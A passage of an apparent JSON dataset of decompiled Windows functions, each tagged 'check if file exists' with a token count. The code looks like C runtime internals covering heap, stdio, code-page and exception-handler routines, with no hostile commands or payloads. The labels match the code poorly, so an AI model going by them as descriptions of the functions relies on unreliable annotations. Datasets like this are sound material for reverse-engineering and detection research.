-1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x00410ce7;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x00410ce7:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x4431d0)) && (var_4h == *0x4431e8)) {\n        *0x4431d0 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2112
    },
    "00411b62": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00411b62(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uchar auStack68 [46];\n    int16_t iStack22;\n    int32_t *piStack20;\n    \n    puVar3 = fcn.0040b8de(0x480);\n    if (puVar3 == NULL) {\n        uVar4 = 0xffffffff;\n    }\n    else {\n        *0x443060 = 0x20;\n        *0x4430a0 = puVar3;\n        for (; puVar3 < *0x4430a0 + 0x120; puVar3 = puVar3 + 9) {\n            *puVar3 = 0xffffffff;\n            puVar3[2] = 0;\n            *(puVar3 + 1) = 0;\n            *(puVar3 + 5) = 10;\n        }\n        (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(auStack68);\n        if ((iStack22 != 0) && (piStack20 != NULL)) {\n            iVar8 = *piStack20;\n            piStack20 = piStack20 + 1;\n            piVar9 = iVar8 + piStack20;\n            if (0x7ff < iVar8) {\n                iVar8 = 0x800;\n            }\n            iVar6 = iVar8;\n            if (*0x443060 < iVar8) {\n                puVar3 = 0x4430a4;\n                do {\n                    puVar5 = fcn.0040b8de(0x480);\n                    iVar6 = *0x443060;\n                    if (puVar5 == NULL) break;\n                    *0x443060 = *0x443060 + 0x20;\n                    *puVar3 = puVar5;\n                    puVar2 = puVar5;\n                    for (; puVar5 < puVar2 + 0x120; puVar5 = puVar5 + 9) {\n                        *puVar5 = 0xffffffff;\n                        puVar5[2] = 0;\n                        *(puVar5 + 1) = 0;\n                        *(puVar5 + 5) = 10;\n                        puVar2 = *puVar3;\n                    }\n                    puVar3 = puVar3 + 1;\n                    iVar6 = iVar8;\n                } while (*0x443060 < iVar8);\n            }\n            uVar7 = 0;\n            if (0 < iVar6) {\n                do {\n                    if (((*piVar9 != -1) && ((*piStack20 & 1) != 0)) &&\n                       (((*piStack20 & 8) != 0 || (iVar8 = (*_sym.imp.KERNEL32.dll_GetFileType)(*piVar9),  iVar8 != 0)))\n                       ) {\n                        piVar1 = *((uVar7 >> 5) * 4 + 0x4430a0) + (uVar7 & 0x1f) * 0x24;\n                        *piVar1 = *piVar9;\n                        *(piVar1 + 1) = *piStack20;\n                        iVar8 = fcn.004159e1(piVar1 + 3, 4000);\n                        if (iVar8 == 0) {\n                            return 0xffffffff;\n                        }\n                        piVar1[2] = piVar1[2] + 1;\n                    }\n                    piVar9 = piVar9 + 1;\n                    uVar7 = uVar7 + 1;\n                    piStack20 = piStack20 + 1;\n                } while (uVar7 < iVar6);\n            }\n        }\n        iVar8 = 0;\n        do {\n            piVar9 = *0x4430a0 + iVar8 * 9;\n            if (*piVar9 == -1) {\n                *(piVar9 + 1) = 0x81;\n                if (iVar8 == 0) {\n                    iVar6 = -10;\n                }\n                else {\n                    iVar6 = -0xb - (iVar8 != 1);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetStdHandle)(iVar6);\n                if ((iVar6 == -1) || (uVar7 = (*_sym.imp.KERNEL32.dll_GetFileType)(iVar6),  uVar7 == 0)) {\n                    *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                }\n                else {\n                    *piVar9 = iVar6;\n                    if ((uVar7 & 0xff) == 2) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 0x40;\n                    }\n                    else if ((uVar7 & 0xff) == 3) {\n                        *(piVar9 + 1) = *(piVar9 + 1) | 8;\n                    }\n                    iVar6 = fcn.004159e1(piVar9 + 3, 4000);\n                    if (iVar6 == 0) {\n                        return 0xffffffff;\n                    }\n                    piVar9[2] = piVar9[2] + 1;\n                }\n            }\n            else {\n                *(piVar9 + 1) = *(piVar9 + 1) | 0x80;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 3);\n        (*_sym.imp.KERNEL32.dll_SetHandleCount)(*0x443060);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 1263
    },
    "004123bc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004123bc(uint8_t **param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    puVar3 = param_1[3];\n    if (((puVar3 & 0x83) != 0) && ((puVar3 & 0x40) == 0)) {\n        if ((puVar3 & 2) == 0) {\n            param_1[3] = puVar3 | 1;\n            if ((puVar3 & 0x10c) == 0) {\n                fcn.00412378(param_1);\n            }\n            else {\n                *param_1 = param_1[2];\n            }\n            puVar3 = fcn.00417a99(param_1[4], param_1[2], param_1[6]);\n            param_1[1] = puVar3;\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((param_1[3] & 0x82) == 0) {\n                    puVar2 = param_1[4];\n                    if (puVar2 == 0xffffffff) {\n                        iVar4 = 0x441a30;\n                    }\n                    else {\n                        iVar4 = *((puVar2 >> 5) * 4 + 0x4430a0) + (puVar2 & 0x1f) * 0x24;\n                    }\n                    if ((*(iVar4 + 4) & 0x82) == 0x82) {\n                        param_1[3] = param_1[3] | 0x2000;\n                    }\n                }\n                if (((param_1[6] == 0x200) && ((param_1[3] & 8) != 0)) && ((param_1[3] & 0x400) == 0)) {\n                    param_1[6] = 0x1000;\n                }\n                param_1[1] = puVar3 + -1;\n                uVar1 = **param_1;\n                *param_1 = *param_1 + 1;\n                return uVar1;\n            }\n            param_1[3] = param_1[3] | (-(puVar3 != NULL) & 0x10) + 0x10;\n            param_1[1] = NULL;\n        }\n        else {\n            param_1[3] = puVar3 | 0x20;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 578
    },
    "0041249d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041249d(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_ch;\n    uVar1 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {\ncode_r0x004125a9:\n        arg_ch[3] = uVar1 | 0x20;\n    }\n    else {\n        if ((uVar1 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar1 & 0x10) == 0) goto code_r0x004125a9;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar1 & 0xfffffffe;\n        }\n        uVar1 = arg_ch[3];\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        piVar2[3] = uVar1 & 0xffffffef | 2;\n        if (((uVar1 & 0x10c) == 0) &&\n           (((piVar2 != 0x441378 && (piVar2 != 0x441398)) || (iVar3 = fcn.00417b44(arg_8h_00),  iVar3 == 0)))) {\n            fcn.00412378(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            iVar3 = 1;\n            arg_ch = fcn.00412211(arg_8h_00, &arg_8h, 1);\n        }\n        else {\n            iVar4 = piVar2[2];\n            iVar3 = *piVar2;\n            *piVar2 = iVar4 + 1;\n            iVar3 = iVar3 - iVar4;\n            piVar2[1] = piVar2[6] + -1;\n            if (iVar3 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar4 = 0x441a30;\n                }\n                else {\n                    iVar4 = *((arg_8h_00 >> 5) * 4 + 0x4430a0) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar4 + 4) & 0x20) != 0) {\n                    fcn.00412a65(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.00412211(arg_8h_00, iVar4, iVar3);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == iVar3) {\n            return arg_8h & 0xff;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 723
    },
    "00412cb3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412cb3(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = CONCAT44(arg_10h, arg_ch);\n    if (((*(arg_8h + 0xc) & 0x83) == 0) || (((arg_14h != 0 && (arg_14h != 1)) && (arg_14h != 2)))) {\n        puVar2 = fcn.0041296c();\n        *puVar2 = 0x16;\n    }\n    else {\n        *(arg_8h + 0xc) = *(arg_8h + 0xc) & 0xffffffef;\n        if (arg_14h == 1) {\n            iVar3 = fcn.00412790(arg_8h);\n            iVar4 = iVar3 + iVar4;\n            arg_14h = 0;\n        }\n        arg_10h = iVar4 >> 0x20;\n        arg_ch = iVar4;\n        fcn.0040d102(arg_8h);\n        uVar1 = *(arg_8h + 0xc);\n        if (uVar1 < '\\0') {\n            *(arg_8h + 0xc) = uVar1 & 0xfffffffc;\n        }\n        else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {\n            *(arg_8h + 0x18) = 0x200;\n        }\n        iVar4 = fcn.004173bf(*(arg_8h + 0x10), arg_ch, arg_10h, arg_14h);\n        if (iVar4 != -1) {\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 447
    },
    "004153b8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: lpCharType\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.004153b8(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_20h_2, \n            uint noname_7, uint arg_8h, uint lpMultiByteStr, uint cbMultiByte, uint arg_14h, uint CodePage, uint arg_1ch\n            , uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    int32_t noname_1_00;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    int32_t noname_0_00;\n    uint dwInfoType;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_2ch;\n    uint var_28h_2;\n    uint var_24h_2;\n    uint var_20h_2;\n    int32_t lpCharType;\n    int32_t var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    fcn.0040f0bc();\n    iVar3 = 0;\n    if (*0x442c08 == 0) {\n        var_38h = 0x4153e2;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x442c08 = 2;\n            }\n        }\n        else {\n            *0x442c08 = 1;\n        }\n    }\n    if ((*0x442c08 == 2) || (*0x442c08 == 0)) {\n        iVar1 = *(unaff_EBP + 0x1c);\n        if (*(unaff_EBP + 0x1c) == 0) {\n            iVar1 = *0x442bf0;\n        }\n        noname_0_00 = *(unaff_EBP + 0x18);\n        if (*(unaff_EBP + 0x18) == 0) {\n            noname_0_00 = *0x442c00;\n        }\n        noname_1_00 = fcn.00415600(iVar1);\n        if (noname_1_00 != -1) {\n            if (noname_1_00 != noname_0_00) {\n                lpCharType = noname_0_00;\n                var_38h = noname_1_00;\n                iVar3 = fcn.00415643(noname_0_00, noname_1_00, *(unaff_EBP + 0xc), unaff_EBP + 0x10, 0, 0, 0x43cf48, \n                                     0x1c);\n                if (iVar3 == 0) goto code_r0x00415569;\n                *(unaff_EBP + 0xc) = iVar3;\n            }\n            lpCharType = 0x41555a;\n            var_38h = iVar1;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeA)();\n            if (iVar3 != 0) {\n                lpCharType = iVar3;\n                fcn.0040cfb5(iVar3);\n            }\n        }\n    }\n    else if (*0x442c08 == 1) {\n        *(unaff_EBP + -0x24) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x442c00;\n        }\n        var_38h = (*(unaff_EBP + 0x20) != 0) * 8 + 1;\n        lpCharType = *(unaff_EBP + 0x18);\n        arg_8h_00 = &fcn.004153b8::lpCharType;\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &fcn.004153b8::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.004153b8::lpCharType;\n            fcn.0040cf50(&fcn.004153b8::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.004130d3(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x00415569;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.0040cfb5(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00415569:\n    *(unaff_EBP + -0x3c) = 0x415571;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1558
    },
    "00415643": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00415643(uint noname_0, uint noname_1, uint lpMultiByteStr, uint arg_14h_2, uint arg_8h, uint arg_ch, uint noname_6\n            , uint arg_14h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uchar *arg_ch_00;\n    uint *arg_8h_00;\n    int32_t unaff_EBP;\n    uint CodePage;\n    uint var_4h;\n    uint var_48h_2;\n    uint var_54h;\n    uint cbMultiByte;\n    uint var_3ch_2;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x38;\n    var_4h_2 = 0x43cf58;\n    var_18h = 0x41564f;\n    fcn.0040f0bc();\n    *(unaff_EBP + -0x1c) = *0x441350;\n    *(unaff_EBP + -0x34) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    puVar1 = **(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x40) = puVar1;\n    *(unaff_EBP + -0x3c) = 0;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetCPInfo;\n    if (*(unaff_EBP + 8) == *(unaff_EBP + 0xc)) {\n        arg_8h_00 = *(unaff_EBP + -0x48);\n    }\n    else {\n        var_18h = unaff_EBP + -0x30;\n        var_1ch = *(unaff_EBP + 8);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n        if ((((iVar3 != 0) && (*(unaff_EBP + -0x30) == 1)) &&\n            (iVar3 = (*pcVar2)(*(unaff_EBP + 0xc), unaff_EBP + -0x30),  iVar3 != 0)) && (*(unaff_EBP + -0x30) == 1)) {\n            *(unaff_EBP + -0x3c) = 1;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = *(unaff_EBP + -0x38);\n        }\n        else {\n            arg_ch_00 = puVar1;\n            if (puVar1 == 0xffffffff) {\n                iVar3 = fcn.0040bc50(*(unaff_EBP + 0x10));\n                arg_ch_00 = iVar3 + 1;\n            }\n            *(unaff_EBP + -0x38) = arg_ch_00;\n        }\n        if (*(unaff_EBP + -0x3c) == 0) {\n            arg_ch_00 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                  (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), puVar1, 0, 0);\n            *(unaff_EBP + -0x38) = arg_ch_00;\n            if (arg_ch_00 == NULL) goto code_r0x004157fb;\n        }\n        arg_8h_00 = &fcn.00415643::var_1ch;\n        *(unaff_EBP + -4) = 0;\n        fcn.0040fc80();\n        *(unaff_EBP + -0x18) = &fcn.00415643::var_1ch;\n        *(unaff_EBP + -0x48) = &fcn.00415643::var_1ch;\n        fcn.0040cf50(&fcn.00415643::var_1ch, 0, arg_ch_00 * 2);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*0x10 == 0x10) {\n            arg_8h_00 = fcn.004130d3(2, arg_ch_00);\n            if (arg_8h_00 == NULL) goto code_r0x004157fb;\n            *(unaff_EBP + -0x44) = 1;\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                          (*(unaff_EBP + 8), 1, *(unaff_EBP + 0x10), *(unaff_EBP + -0x40), arg_8h_00, arg_ch_00);\n        if (iVar3 != 0) {\n            if (*(unaff_EBP + 0x18) == 0) {\n                if (*(unaff_EBP + -0x3c) == 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    arg_ch_00 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                          (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, 0, 0);\n                    if (arg_ch_00 == NULL) goto code_r0x004157ec;\n                }\n                var_1ch = 1;\n                var_18h = arg_ch_00;\n                iVar3 = fcn.004130d3(1, arg_ch_00);\n                *(unaff_EBP + -0x34) = iVar3;\n                if (iVar3 != 0) {\n                    var_18h = NULL;\n                    var_1ch = 0;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, iVar3, arg_ch_00);\n                    if (iVar3 == 0) {\n                        var_18h = *(unaff_EBP + -0x34);\n                        var_1ch = 0x4157d6;\n                        fcn.0040cfb5(var_18h);\n                        *(unaff_EBP + -0x34) = 0;\n                    }\n                    else if (*(unaff_EBP + -0x40) != -1) {\n                        **(unaff_EBP + 0x14) = iVar3;\n                    }\n                }\n            }\n            else {\n                var_18h = NULL;\n                var_1ch = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0xc), 0, arg_8h_00, arg_ch_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c)\n                                  );\n                if (iVar3 != 0) {\n                    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x18);\n                }\n            }\n        }\n    }\ncode_r0x004157ec:\n    if (*(unaff_EBP + -0x44) != 0) {\n        var_1ch = 0x4157f7;\n        var_18h = arg_8h_00;\n        fcn.0040cfb5(arg_8h_00);\n    }\ncode_r0x004157fb:\n    *(unaff_EBP + -0x58) = 0x415806;\n    fcn.0040d590();\n    *(unaff_EBP + -0x58) = 0x41580b;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1844
    },
    "00415a6c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00415a6c(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x442c40) {\n        do {\n            if (*(iVar12 * 4 + 0x442c48) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x442c88, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x442c48) == uVar10) goto code_r0x00415c67;\n                iVar12 = *0x442c40 + -1;\n                if (iVar12 < 0) goto code_r0x00415c55;\n                goto code_r0x00415c45;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x442c40);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x442c88, 1);\n    iVar12 = *0x442c40;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x442c40;\n    if (0 < *0x442c40) {\n        puVar8 = *0x442c40 * 4 + 0x442c44;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x442c40 < 0x10) {\n            iVar7 = *0x442c40;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x442c48;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x442c40 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x442c88, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x00415c45:\n        if (*(iVar12 * 4 + 0x442c48) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x00415c55:\n        if (*0x442c40 < 0x10) {\n            *0x442c40 = *0x442c40 + 1;\n        }\n        iVar12 = *0x442c40 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x00415c7f;\ncode_r0x00415c67:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x442c48;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x00415c7f:\n    (*pcVar3)(0x442c88, 0);\n    return 1;\n}\n",
        "token_count": 1644
    },
    "004164b7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004164b7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43cfe0, 0x14);\n    *(unaff_EBP + -0x20) = 0xffffffff;\n    fcn.0040f088(0xd);\n    *(unaff_EBP + -4) = 0;\n    *0x442ca0 = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == -2) {\n        *0x442ca0 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetOEMCP)();\n    }\n    else if (iVar1 == -3) {\n        *0x442ca0 = 1;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetACP)();\n    }\n    else if (iVar1 == -4) {\n        *0x442ca0 = 1;\n        iVar1 = *0x442c00;\n    }\n    *(unaff_EBP + 8) = iVar1;\n    arg_8h_00 = *0x442dfc;\n    if (iVar1 == *0x442f24) {\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x24) = *0x442dfc;\n        if ((arg_8h_00 == NULL) || (*arg_8h_00 != 0)) {\n            arg_8h_00 = fcn.0040b8de(0x220);\n            *(unaff_EBP + -0x24) = arg_8h_00;\n        }\n        if (arg_8h_00 != NULL) {\n            iVar1 = fcn.00416317(*(unaff_EBP + 8));\n            *(unaff_EBP + -0x20) = iVar1;\n            if (iVar1 == 0) {\n                *arg_8h_00 = 0;\n                arg_8h_00[1] = *0x442f24;\n                arg_8h_00[2] = *0x442e00;\n                arg_8h_00[3] = *0x442d84;\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 5; iVar1 = iVar1 + 1) {\n                    *(arg_8h_00 + iVar1 * 2 + 0x10) = *(iVar1 * 2 + 0x442f30);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  iVar1 < 0x101; iVar1 = iVar1 + 1) {\n                    *(iVar1 + 0x1c + arg_8h_00) = *(iVar1 + 0x442e20);\n                }\n                for (iVar1 = 0; *(unaff_EBP + -0x1c) = iVar1,  *0x442dfc = arg_8h_00,  iVar1 < 0x100; 